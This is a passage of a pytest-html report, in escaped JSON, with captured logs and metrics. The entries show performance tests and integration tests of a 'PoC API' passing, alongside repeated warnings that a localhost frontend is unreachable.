TestPerformance.test_cpu_usage_during_operations - INFO - \u2705 CPU usage stats: Avg 0.0%, Max 0.1%, Min 0.0%\n2025-12-18 09:24:14,275 - TestPerformance.test_cpu_usage_during_operations - INFO - \u2705 CPU usage within acceptable limits\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPerformance.test_cpu_usage_during_operations:test_framework.py:390 Testing CPU usage during operations\nINFO     TestPerformance.test_cpu_usage_during_operations:test_framework.py:390 Task 1: CPU usage 0.1%\nINFO     TestPerformance.test_cpu_usage_during_operations:test_framework.py:390 Task 2: CPU usage 0.0%\nINFO     TestPerformance.test_cpu_usage_during_operations:test_framework.py:390 Task 3: CPU usage 0.0%\nINFO     TestPerformance.test_cpu_usage_during_operations:test_framework.py:390 Task 4: CPU usage 0.0%\nINFO     TestPerformance.test_cpu_usage_during_operations:test_framework.py:390 Task 5: CPU usage 0.0%\nINFO     TestPerformance.test_cpu_usage_during_operations:test_framework.py:390 \u2705 CPU usage stats: Avg 0.0%, Max 0.1%, Min 0.0%\nINFO     TestPerformance.test_cpu_usage_during_operations:test_framework.py:390 \u2705 CPU usage within acceptable limits\n\n&#34;}], &#34;tests/test_performance.py::TestPerformance::test_file_operation_performance&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_performance.py::TestPerformance::test_file_operation_performance&#34;, &#34;duration&#34;: &#34;52 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_performance.py::TestPerformance::test_file_operation_performance&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;52 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_file_operation_performance - PASSED\nDuration: 0.05s\nCategory: performance\nMetrics:\n  file_write_speed_100: 25.88\n  file_read_speed_100: 150.78\n  file_size_100: 15191\n  file_write_speed_1000: 40.23\n  file_read_speed_1000: 302.31\n  file_size_1000: 155691\n  file_write_speed_10000: 44.56\n  file_read_speed_10000: 314.42\n  file_size_10000: 1596691\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:14,279 - TestPerformance.test_file_operation_performance - INFO - Testing file operation performance\n2025-12-18 09:24:14,280 - TestPerformance.test_file_operation_performance - INFO - \u2705 Size 100: Write 25.88 MB/s, Read 150.78 MB/s\n2025-12-18 09:24:14,285 - TestPerformance.test_file_operation_performance - INFO - \u2705 Size 1000: Write 40.23 MB/s, Read 302.31 MB/s\n2025-12-18 09:24:14,326 - TestPerformance.test_file_operation_performance - INFO - \u2705 Size 10000: Write 44.56 MB/s, Read 314.42 MB/s\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPerformance.test_file_operation_performance:test_framework.py:390 Testing file operation performance\nINFO     TestPerformance.test_file_operation_performance:test_framework.py:390 \u2705 Size 100: Write 25.88 MB/s, Read 150.78 MB/s\nINFO     TestPerformance.test_file_operation_performance:test_framework.py:390 \u2705 Size 1000: Write 40.23 MB/s, Read 302.31 MB/s\nINFO     TestPerformance.test_file_operation_performance:test_framework.py:390 \u2705 Size 10000: Write 44.56 MB/s, Read 314.42 MB/s\n\n&#34;}], &#34;tests/test_performance.py::TestPerformance::test_memory_usage_patterns&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_performance.py::TestPerformance::test_memory_usage_patterns&#34;, &#34;duration&#34;: &#34;4 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_performance.py::TestPerformance::test_memory_usage_patterns&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;4 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_memory_usage_patterns - PASSED\nDuration: 0.00s\nCategory: performance\nMetrics:\n  initial_memory_mb: 413.30\n  memory_usage_acceptable: True\n  peak_memory_mb: 413.34\n  final_memory_mb: 413.34\n  memory_growth_mb: 0.05\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:14,331 - TestPerformance.test_memory_usage_patterns - INFO - Testing memory usage patterns\n2025-12-18 09:24:14,331 - TestPerformance.test_memory_usage_patterns - INFO - Initial memory usage: 413.30 MB\n2025-12-18 09:24:14,331 - TestPerformance.test_memory_usage_patterns - INFO - Peak memory usage: 413.34 MB\n2025-12-18 09:24:14,331 - TestPerformance.test_memory_usage_patterns - INFO - Final memory usage: 413.34 MB\n2025-12-18 09:24:14,331 - TestPerformance.test_memory_usage_patterns - INFO - Memory growth: 0.05 MB\n2025-12-18 09:24:14,331 - TestPerformance.test_memory_usage_patterns - INFO - \u2705 Memory usage within acceptable limits\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPerformance.test_memory_usage_patterns:test_framework.py:390 Testing memory usage patterns\nINFO     TestPerformance.test_memory_usage_patterns:test_framework.py:390 Initial memory usage: 413.30 MB\nINFO     TestPerformance.test_memory_usage_patterns:test_framework.py:390 Peak memory usage: 413.34 MB\nINFO     TestPerformance.test_memory_usage_patterns:test_framework.py:390 Final memory usage: 413.34 MB\nINFO     TestPerformance.test_memory_usage_patterns:test_framework.py:390 Memory growth: 0.05 MB\nINFO     TestPerformance.test_memory_usage_patterns:test_framework.py:390 \u2705 Memory usage within acceptable limits\n\n&#34;}], &#34;tests/test_performance.py::TestPerformance::test_scalability_with_data_size&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_performance.py::TestPerformance::test_scalability_with_data_size&#34;, &#34;duration&#34;: &#34;3 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_performance.py::TestPerformance::test_scalability_with_data_size&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;3 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_scalability_with_data_size - PASSED\nDuration: 0.00s\nCategory: performance\nMetrics:\n  processing_time_10: 0.00\n  items_per_second_10: 3226387.69\n  avg_content_length_10: 30.00\n  processing_time_100: 0.00\n  items_per_second_100: 12710012.12\n  avg_content_length_100: 30.90\n  processing_time_1000: 0.00\n  items_per_second_1000: 13231242.90\n  avg_content_length_1000: 31.89\n  scalability_acceptable: True\n  scalability_ratio_10_100: 2.54\n  scalability_ratio_100_1000: 9.61\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:14,335 - TestPerformance.test_scalability_with_data_size - INFO - Testing scalability with data size\n2025-12-18 09:24:14,335 - TestPerformance.test_scalability_with_data_size - INFO - \u2705 Size 10: 0.000s (3226387.7 items/sec)\n2025-12-18 09:24:14,335 - TestPerformance.test_scalability_with_data_size - INFO - \u2705 Size 100: 0.000s (12710012.1 items/sec)\n2025-12-18 09:24:14,335 - TestPerformance.test_scalability_with_data_size - INFO - \u2705 Size 1000: 0.000s (13231242.9 items/sec)\n2025-12-18 09:24:14,335 - TestPerformance.test_scalability_with_data_size - INFO - Scalability ratios: 10\u2192100: 2.54x, 100\u21921000: 9.61x\n2025-12-18 09:24:14,335 - TestPerformance.test_scalability_with_data_size - INFO - \u2705 Scalability within acceptable limits\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPerformance.test_scalability_with_data_size:test_framework.py:390 Testing scalability with data size\nINFO     TestPerformance.test_scalability_with_data_size:test_framework.py:390 \u2705 Size 10: 0.000s (3226387.7 items/sec)\nINFO     TestPerformance.test_scalability_with_data_size:test_framework.py:390 \u2705 Size 100: 0.000s (12710012.1 items/sec)\nINFO     TestPerformance.test_scalability_with_data_size:test_framework.py:390 \u2705 Size 1000: 0.000s (13231242.9 items/sec)\nINFO     TestPerformance.test_scalability_with_data_size:test_framework.py:390 Scalability ratios: 10\u2192100: 2.54x, 100\u21921000: 9.61x\nINFO     TestPerformance.test_scalability_with_data_size:test_framework.py:390 \u2705 Scalability within acceptable limits\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_admin_cleanup&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_admin_cleanup&#34;, &#34;duration&#34;: &#34;00:00:03&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_admin_cleanup&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:03&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_admin_cleanup - PASSED\nDuration: 3.47s\nCategory: integration\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:15,350 - TestPoCAPI.test_admin_cleanup - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x145fe85a0&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:15,352 - TestPoCAPI.test_admin_cleanup - INFO - Creating test contribution for subsequent tests...\n2025-12-18 09:24:17,048 - TestPoCAPI.test_admin_cleanup - INFO - \u2705 Test contribution created: 97664b98f49f637c8d9f07a446a6a26cb88d75ea29ea228a0d4e5aa4099106cc\n2025-12-18 09:24:17,798 - TestPoCAPI.test_admin_cleanup - INFO - \u2705 Test contribution evaluated: 97664b98f49f637c8d9f07a446a6a26cb88d75ea29ea228a0d4e5aa4099106cc\n2025-12-18 09:24:17,800 - TestPoCAPI.test_admin_cleanup - INFO - Testing admin cleanup endpoints\n2025-12-18 09:24:17,802 - TestPoCAPI.test_admin_cleanup - INFO - \u2705 Admin cleanup successful\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_admin_cleanup:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x145fe85a0&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_admin_cleanup:test_framework.py:390 Creating test contribution for subsequent tests...\nINFO     TestPoCAPI.test_admin_cleanup:test_framework.py:390 \u2705 Test contribution created: 97664b98f49f637c8d9f07a446a6a26cb88d75ea29ea228a0d4e5aa4099106cc\nINFO     TestPoCAPI.test_admin_cleanup:test_framework.py:390 \u2705 Test contribution evaluated: 97664b98f49f637c8d9f07a446a6a26cb88d75ea29ea228a0d4e5aa4099106cc\nINFO     TestPoCAPI.test_admin_cleanup:test_framework.py:390 Testing admin cleanup endpoints\nINFO     TestPoCAPI.test_admin_cleanup:test_framework.py:390 \u2705 Admin cleanup successful\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_api_concurrent_requests&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_api_concurrent_requests&#34;, &#34;duration&#34;: &#34;00:00:04&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_api_concurrent_requests&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:04&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_api_concurrent_requests - PASSED\nDuration: 3.52s\nCategory: integration\nMetrics:\n  concurrent_success_rate: 100.00\n  concurrent_avg_duration: 0.00\n  concurrent_max_duration: 0.00\n  concurrent_min_duration: 0.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:18,818 - TestPoCAPI.test_api_concurrent_requests - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460ae470&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:18,820 - TestPoCAPI.test_api_concurrent_requests - INFO - Creating test contribution for subsequent tests...\n2025-12-18 09:24:20,383 - TestPoCAPI.test_api_concurrent_requests - INFO - \u2705 Test contribution created: b1d9a91c9982ffa4dc06390187f559abad839691c8c8a6354085a144d73dfc6f\n2025-12-18 09:24:21,316 - TestPoCAPI.test_api_concurrent_requests - INFO - \u2705 Test contribution evaluated: b1d9a91c9982ffa4dc06390187f559abad839691c8c8a6354085a144d73dfc6f\n2025-12-18 09:24:21,316 - TestPoCAPI.test_api_concurrent_requests - INFO - Testing API concurrent request handling\n2025-12-18 09:24:21,323 - TestPoCAPI.test_api_concurrent_requests - INFO - \u2705 Concurrent requests: 10/10 successful (100.0%)\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_api_concurrent_requests:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460ae470&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_api_concurrent_requests:test_framework.py:390 Creating test contribution for subsequent tests...\nINFO     TestPoCAPI.test_api_concurrent_requests:test_framework.py:390 \u2705 Test contribution created: b1d9a91c9982ffa4dc06390187f559abad839691c8c8a6354085a144d73dfc6f\nINFO     TestPoCAPI.test_api_concurrent_requests:test_framework.py:390 \u2705 Test contribution evaluated: b1d9a91c9982ffa4dc06390187f559abad839691c8c8a6354085a144d73dfc6f\nINFO     TestPoCAPI.test_api_concurrent_requests:test_framework.py:390 Testing API concurrent request handling\nINFO     TestPoCAPI.test_api_concurrent_requests:test_framework.py:390 \u2705 Concurrent requests: 10/10 successful (100.0%)\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_api_error_scenarios&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_api_error_scenarios&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_api_error_scenarios&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_api_error_scenarios - PASSED\nDuration: 1.03s\nCategory: integration\nMetrics:\n  error_scenario_missing_file: 400\n  error_scenario_invalid_data: 400\n  error_scenario_not_found: 404\n  error_scenario_method_not_allowed: 404\n  error_scenario_too_large: 400\n  error_scenario_unsupported_format: 400\n  error_scenarios_success_rate: 64.29\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:22,334 - TestPoCAPI.test_api_error_scenarios - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460ae580&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:22,335 - TestPoCAPI.test_api_error_scenarios - INFO - Found 1 existing contributions\n2025-12-18 09:24:22,335 - TestPoCAPI.test_api_error_scenarios - INFO - Testing API error scenarios\n2025-12-18 09:24:22,337 - TestPoCAPI.test_api_error_scenarios - INFO - \u2705 missing_file: 400 (expected 400)\n2025-12-18 09:24:22,338 - TestPoCAPI.test_api_error_scenarios - WARNING - \u26a0\ufe0f  invalid_data: got 400, expected 422\n2025-12-18 09:24:22,338 - TestPoCAPI.test_api_error_scenarios - WARNING - \u26a0\ufe0f  not_found: got 200, expected 404\n2025-12-18 09:24:22,339 - TestPoCAPI.test_api_error_scenarios - INFO - \u2705 not_found: 404 (expected 404)\n2025-12-18 09:24:22,341 - TestPoCAPI.test_api_error_scenarios - INFO - \u2705 method_not_allowed: 405 (expected 405)\n2025-12-18 09:24:22,342 - TestPoCAPI.test_api_error_scenarios - INFO - \u2705 method_not_allowed: 405 (expected 405)\n2025-12-18 09:24:22,343 - TestPoCAPI.test_api_error_scenarios - INFO - \u2705 method_not_allowed: 405 (expected 405)\n2025-12-18 09:24:22,344 - TestPoCAPI.test_api_error_scenarios - INFO - \u2705 method_not_allowed: 405 (expected 405)\n2025-12-18 09:24:22,345 - TestPoCAPI.test_api_error_scenarios - INFO - \u2705 method_not_allowed: 405 (expected 405)\n2025-12-18 09:24:22,346 - TestPoCAPI.test_api_error_scenarios - WARNING - \u26a0\ufe0f  method_not_allowed: got 404, expected 405\n2025-12-18 09:24:22,347 - TestPoCAPI.test_api_error_scenarios - INFO - \u2705 not_found: 404 (expected 404)\n2025-12-18 09:24:22,348 - TestPoCAPI.test_api_error_scenarios - INFO - \u2705 not_found: 404 (expected 404)\n2025-12-18 09:24:22,349 - TestPoCAPI.test_api_error_scenarios - WARNING - \u26a0\ufe0f  too_large: got 400, expected 413\n2025-12-18 09:24:22,351 - TestPoCAPI.test_api_error_scenarios - WARNING - \u26a0\ufe0f  unsupported_format: got 400, expected 415\n2025-12-18 09:24:22,351 - TestPoCAPI.test_api_error_scenarios - INFO - \u2705 Error scenarios tested: 9/14 (64.3%)\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_api_error_scenarios:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460ae580&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_api_error_scenarios:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_api_error_scenarios:test_framework.py:390 Testing API error scenarios\nINFO     TestPoCAPI.test_api_error_scenarios:test_framework.py:390 \u2705 missing_file: 400 (expected 400)\nWARNING  TestPoCAPI.test_api_error_scenarios:test_framework.py:400 \u26a0\ufe0f  invalid_data: got 400, expected 422\nWARNING  TestPoCAPI.test_api_error_scenarios:test_framework.py:400 \u26a0\ufe0f  not_found: got 200, expected 404\nINFO     TestPoCAPI.test_api_error_scenarios:test_framework.py:390 \u2705 not_found: 404 (expected 404)\nINFO     TestPoCAPI.test_api_error_scenarios:test_framework.py:390 \u2705 method_not_allowed: 405 (expected 405)\nINFO     TestPoCAPI.test_api_error_scenarios:test_framework.py:390 \u2705 method_not_allowed: 405 (expected 405)\nINFO     TestPoCAPI.test_api_error_scenarios:test_framework.py:390 \u2705 method_not_allowed: 405 (expected 405)\nINFO     TestPoCAPI.test_api_error_scenarios:test_framework.py:390 \u2705 method_not_allowed: 405 (expected 405)\nINFO     TestPoCAPI.test_api_error_scenarios:test_framework.py:390 \u2705 method_not_allowed: 405 (expected 405)\nWARNING  TestPoCAPI.test_api_error_scenarios:test_framework.py:400 \u26a0\ufe0f  method_not_allowed: got 404, expected 405\nINFO     TestPoCAPI.test_api_error_scenarios:test_framework.py:390 \u2705 not_found: 404 (expected 404)\nINFO     TestPoCAPI.test_api_error_scenarios:test_framework.py:390 \u2705 not_found: 404 (expected 404)\nWARNING  TestPoCAPI.test_api_error_scenarios:test_framework.py:400 \u26a0\ufe0f  too_large: got 400, expected 413\nWARNING  TestPoCAPI.test_api_error_scenarios:test_framework.py:400 \u26a0\ufe0f  unsupported_format: got 400, expected 415\nINFO     TestPoCAPI.test_api_error_scenarios:test_framework.py:390 \u2705 Error scenarios tested: 9/14 (64.3%)\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_api_input_validation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_api_input_validation&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_api_input_validation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_api_input_validation - PASSED\nDuration: 1.03s\nCategory: integration\nMetrics:\n  input_validation_rate: 100.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:23,366 - TestPoCAPI.test_api_input_validation - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460af460&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:23,368 - TestPoCAPI.test_api_input_validation - INFO - Found 1 existing contributions\n2025-12-18 09:24:23,369 - TestPoCAPI.test_api_input_validation - INFO - Testing API input validation\n2025-12-18 09:24:23,370 - TestPoCAPI.test_api_input_validation - INFO - \u2705 Invalid input 1 properly rejected: 400\n2025-12-18 09:24:23,372 - TestPoCAPI.test_api_input_validation - INFO - \u2705 Invalid input 2 properly rejected: 400\n2025-12-18 09:24:23,373 - TestPoCAPI.test_api_input_validation - INFO - \u2705 Invalid input 3 properly rejected: 400\n2025-12-18 09:24:23,375 - TestPoCAPI.test_api_input_validation - INFO - \u2705 Invalid input 4 properly rejected: 400\n2025-12-18 09:24:23,376 - TestPoCAPI.test_api_input_validation - INFO - \u2705 Invalid input 5 properly rejected: 400\n2025-12-18 09:24:23,377 - TestPoCAPI.test_api_input_validation - INFO - \u2705 Invalid input 6 properly rejected: 400\n2025-12-18 09:24:23,377 - TestPoCAPI.test_api_input_validation - INFO - \u2705 Input validation: 6/6 properly rejected (100.0%)\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_api_input_validation:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460af460&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_api_input_validation:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_api_input_validation:test_framework.py:390 Testing API input validation\nINFO     TestPoCAPI.test_api_input_validation:test_framework.py:390 \u2705 Invalid input 1 properly rejected: 400\nINFO     TestPoCAPI.test_api_input_validation:test_framework.py:390 \u2705 Invalid input 2 properly rejected: 400\nINFO     TestPoCAPI.test_api_input_validation:test_framework.py:390 \u2705 Invalid input 3 properly rejected: 400\nINFO     TestPoCAPI.test_api_input_validation:test_framework.py:390 \u2705 Invalid input 4 properly rejected: 400\nINFO     TestPoCAPI.test_api_input_validation:test_framework.py:390 \u2705 Invalid input 5 properly rejected: 400\nINFO     TestPoCAPI.test_api_input_validation:test_framework.py:390 \u2705 Invalid input 6 properly rejected: 400\nINFO     TestPoCAPI.test_api_input_validation:test_framework.py:390 \u2705 Input validation: 6/6 properly rejected (100.0%)\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_api_rate_limiting&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_api_rate_limiting&#34;, &#34;duration&#34;: &#34;00:00:03&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_api_rate_limiting&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:03&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_api_rate_limiting - PASSED\nDuration: 3.13s\nCategory: integration\nMetrics:\n  rate_limiting_detected: False\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:24,388 - TestPoCAPI.test_api_rate_limiting - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146594160&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:24,390 - TestPoCAPI.test_api_rate_limiting - INFO - Found 1 existing contributions\n2025-12-18 09:24:24,390 - TestPoCAPI.test_api_rate_limiting - INFO - Testing API rate limiting\n2025-12-18 09:24:26,507 - TestPoCAPI.test_api_rate_limiting - INFO - \u2139\ufe0f  No rate limiting detected (may not be implemented)\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_api_rate_limiting:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146594160&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_api_rate_limiting:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_api_rate_limiting:test_framework.py:390 Testing API rate limiting\nINFO     TestPoCAPI.test_api_rate_limiting:test_framework.py:390 \u2139\ufe0f  No rate limiting detected (may not be implemented)\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_api_response_format_validation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_api_response_format_validation&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_api_response_format_validation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_api_response_format_validation - PASSED\nDuration: 1.03s\nCategory: integration\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:27,526 - TestPoCAPI.test_api_response_format_validation - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146594f30&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:27,529 - TestPoCAPI.test_api_response_format_validation - INFO - Found 1 existing contributions\n2025-12-18 09:24:27,529 - TestPoCAPI.test_api_response_format_validation - INFO - Testing API response format validation\n2025-12-18 09:24:27,534 - TestPoCAPI.test_api_response_format_validation - INFO - \u2705 API response format validation completed\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_api_response_format_validation:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by 